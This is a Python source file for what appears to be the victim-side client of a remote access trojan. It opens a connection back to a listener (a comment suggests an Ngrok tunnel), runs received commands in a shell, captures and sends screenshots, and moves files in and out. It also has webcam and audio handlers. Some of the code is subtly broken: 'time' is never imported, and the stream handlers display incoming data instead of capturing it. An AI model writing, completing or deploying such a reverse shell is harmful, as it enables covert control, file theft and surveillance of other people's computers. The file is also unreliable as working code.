import socket
import subprocess
from PIL import ImageGrab
import os
import cv2
import numpy as np
import pyaudio
import threading
import wave

# Constants for audio streaming
CHUNK_SIZE = 1024
SAMPLE_WIDTH = 2
CHANNELS = 1
SAMPLE_RATE = 44100

# Global variables for audio streaming
audio_streaming = False
audio_stream_thread = None
audio_stream_stop_event = threading.Event()
audio_stream_frames = []

def connect_to_listener(host, port):
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    while True:
        command = client.recv(4096).decode()

        if command.lower() == "exit":
            break

        if command.lower() == "screenshot":
            send_screenshot()
        elif command[:8].lower() == "download":
            download_file(command[9:])
        elif command[:6].lower() == "upload":
            upload_file(command[7:])
        elif command.lower() == "startwebcam":
            start_webcam_streaming()
        elif command.lower() == "stopwebcam":
            stop_webcam_streaming()
        elif command.lower() == "startaudio":
            start_audio_streaming()
        elif command.lower() == "stopaudio":
            stop_audio_streaming()
        elif command.lower().startswith("cd "):
            change_directory(command[3:])
        else:
            execute_command(command)

    client.close()


def send_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.jpg", "JPEG")

    with open("screenshot.jpg", "rb") as file:
        screenshot_data = file.read()

    client.sendall(screenshot_data + b"DONE")


def download_file(file_name):
    if os.path.exists(file_name):
        client.sendall(b"OK")
        time.sleep(2)
        f = open(file_name, "rb")
        client.sendall(f.read())
        f.close()
    else:
        client.sendall(b"FILE_NOT_FOUND")


def upload_file(file_name):
    client.sendall(b"OK")
    time.sleep(2)
    data = client.recv(1024).decode()
    if data == "FILE_NOT_CHOSE":
        print("[!] No File Selected")
        return
    f = open(file_name, "wb")
    client.send(b"OK")
    client.settimeout(1)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            print(f"[*] ☁️ File '{file_name}' uploaded successfully")
            break
    client.settimeout(None)
    f.close()


def start_webcam_streaming():
    threading.Thread(target=receive_webcam_stream).start()


def receive_webcam_stream():
    client.send(b"OK")
    while True:
        data = client.recv(4096)
        if data == b"STOP_WEBCAM_STREAMING":
            break

        # Decode the received frame
        frame = cv2.imdecode(np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR)

        # Display the frame
        cv2.imshow("Webcam Stream", frame)

        # Check for the stop command from the listener
        if cv2.waitKey(1) & 0xFF == ord("q"):
            client.send(b"STOP_WEBCAM_STREAMING")
            break

    cv2.destroyAllWindows()


def start_audio_streaming():
    global audio_streaming, audio_stream_thread
    audio_streaming = True
    audio_stream_thread = threading.Thread(target=receive_audio_stream)
    audio_stream_thread.start()


def stop_audio_streaming():
    global audio_streaming, audio_stream_thread
    audio_streaming = False
    audio_stream_stop_event.set()
    audio_stream_thread.join()
    audio_stream_stop_event.clear()


def receive_audio_stream():
    global audio_stream_frames
    audio_stream_stop_event.clear()

    p = pyaudio.PyAudio()
    stream = p.open(
        format=p.get_format_from_width(SAMPLE_WIDTH),
        channels=CHANNELS,
        rate=SAMPLE_RATE,
        output=True,
        frames_per_buffer=CHUNK_SIZE
    )

    client.send(b"OK")

    while audio_streaming:
        data = client.recv(CHUNK_SIZE)
        stream.write(data)

        if audio_stream_stop_event.is_set():
            break

    stream.stop_stream()
    stream.close()
    p.terminate()


def change_directory(directory):
    try:
        os.chdir(directory)
        client.sendall(os.getcwd().encode())
    except FileNotFoundError:
        client.sendall(b"DIR_NOT_FOUND")


def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True)
    output = result.stdout + result.stderr
    client.sendall(output)


if __name__ == "__main__":
    host = "localhost"  # Replace with your Ngrok tunnel URL
    port = 1234  # Choose a port number
    connect_to_listener(host, port)
